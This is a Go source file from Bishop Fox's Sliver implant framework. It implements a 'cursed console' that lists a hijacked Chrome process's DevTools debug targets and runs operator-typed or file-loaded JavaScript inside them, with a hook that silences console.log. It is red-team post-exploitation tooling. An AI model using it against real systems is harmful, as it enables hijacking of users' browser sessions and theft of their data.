package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"strings"
	"text/tabwriter"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/reeflective/readline"
	"github.com/spf13/cobra"
)

func CursedConsoleCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	curse := selectCursedProcess(con)
	if curse == nil {
		return
	}
	con.Println()
	con.PrintInfof("Querying debug targets ... ")
	targets, err := overlord.QueryDebugTargets(curse.DebugURL().String())
	con.Printf(console.Clearln + "\r")
	if err != nil {
		con.PrintErrorf("Failed to query debug targets: %s\n", err)
		return
	}
	target := selectDebugTarget(targets, con)
	if target == nil {
		return
	}
	con.PrintInfof("Connecting to '%s', use 'exit' to return ... \n\n", target.Title)
	startCursedConsole(curse, true, target, con)
}

func selectDebugTarget(targets []overlord.ChromeDebugTarget, con *console.SliverClient) *overlord.ChromeDebugTarget {
	if len(targets) < 1 {
		con.PrintErrorf("No debug targets\n")
		return nil
	}

	id2target := map[string]overlord.ChromeDebugTarget{}
	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)
	for _, target := range targets {
		fmt.Fprintf(table, "%s\t%s\t%s\n", target.ID, target.Title, target.URL)
		id2target[target.ID] = target
	}
	table.Flush()
	options := strings.Split(outputBuf.String(), "\n")
	options = options[:len(options)-1] // Remove the last empty option
	prompt := &survey.Select{
		Message: "Select a debug target:",
		Options: options,
	}
	selected := ""
	err := survey.AskOne(prompt, &selected)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	if selected == "" {
		return nil
	}
	selectedID := strings.Split(selected, " ")[0]
	selectedTarget := id2target[selectedID]
	return &selectedTarget
}

var helperHooks = []string{
	"console.log = (...a) => {return a;}", // console.log
}

func startCursedConsole(curse *core.CursedProcess, helpers bool, target *overlord.ChromeDebugTarget, con *console.SliverClient) {
	tmpFile, _ := os.CreateTemp("", "cursed")
	shell := readline.NewShell()
	shell.History.AddFromFile("cursed history", tmpFile.Name())
	shell.Prompt.Primary(func() string { return "\033[31mcursed »\033[0m " })
	// 	EOFPrompt:         "exit",

	if con.Settings.VimMode {
		shell.Config.Set("editing-mode", "vi")
	}

	if helpers {
		// Execute helper hooks
		ctx, _, _ := overlord.GetChromeContext(target.WebSocketDebuggerURL, curse)
		for _, hook := range helperHooks {
			_, err := overlord.ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, hook)
			if err != nil {
				con.PrintErrorf("%s\n", err)
			}
		}
	}

	con.Printf(console.Bold+">>> Cursed Console, use ':help' for options%s\n\n", console.Normal)

	for {
		line, err := shell.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		switch strings.TrimSpace(line) {
		case ":help":
			con.Println()
			con.Println("Available commands:")
			con.Println("  :file - Execute local .js file")
			con.Println("  :help - Show this help")
			con.Println("  :exit - Exit the console")
			con.Println()

		case ":file":
			jsCode, err := os.ReadFile(line)
			if err != nil {
				con.PrintErrorf("%s\n", err)
				continue
			}
			ctx, _, _ := overlord.GetChromeContext(target.WebSocketDebuggerURL, curse)
			result, err := overlord.ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, string(jsCode))
			if err != nil {
				con.PrintErrorf("%s\n", err)
				continue
			}
			con.Println()
			if 0 < len(result) {
				con.Printf("%s\n", result)
				con.Println()
			}

		case ":exit":
			fallthrough
		case "exit":
			return

		default:
			ctx, _, _ := overlord.GetChromeContext(target.WebSocketDebuggerURL, curse)
			result, err := overlord.ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, line)
			if err != nil {
				con.PrintErrorf("%s\n", err)
			}
			con.Println()
			if 0 < len(result) {
				con.Printf("%s\n", result)
				con.Println()
			}
		}
	}
}
